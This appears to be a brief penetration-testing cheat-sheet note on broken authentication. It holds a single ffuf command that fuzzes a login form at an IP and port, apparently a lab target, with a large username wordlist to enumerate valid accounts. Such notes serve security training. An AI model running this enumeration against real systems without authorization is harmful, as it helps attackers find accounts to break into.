# Broken Authentication

## Fuzzing for usernames
### FFUF
```bash
fuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.60.100:34962/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```
